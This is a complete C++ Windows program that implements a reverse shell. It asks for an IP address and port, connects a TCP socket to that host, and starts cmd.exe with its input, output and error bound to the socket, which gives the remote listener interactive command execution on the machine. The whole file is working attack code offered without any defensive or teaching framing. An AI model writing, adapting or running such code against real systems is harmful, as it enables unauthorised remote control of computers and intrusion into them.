#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <process.h>
#include <stdexcept>

#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 512;

int main()
{
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return 1;
    }

    // Prompt user to enter IP address and port number
    std::string ip_addr;
    std::cout << "Enter IP address: ";
    std::cin >> ip_addr;

    std::string port_str;
    std::cout << "Enter port number: ";
    std::cin >> port_str;

    // Convert port string to integer
    int port = std::stoi(port_str);

    // Create a TCP socket
    SOCKET shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET)
    {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Prepare sockaddr_in structure
    sockaddr_in shell_addr;
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    InetPton(AF_INET, ip_addr.c_str(), &shell_addr.sin_addr);

    // Connect to remote server
    if (connect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR)
    {
        std::cerr << "Connection to the target server failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Receive server response
    char recv_buffer[BUFFER_SIZE] = {0};
    int bytes_received = recv(shell, recv_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received == SOCKET_ERROR)
    {
        std::cerr << "Error receiving data: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Start cmd.exe process and redirect input and output to the socket
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        return 1;
    }

    // Wait for cmd.exe process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clean up
    closesocket(shell);
    WSACleanup();

    return 0;
}
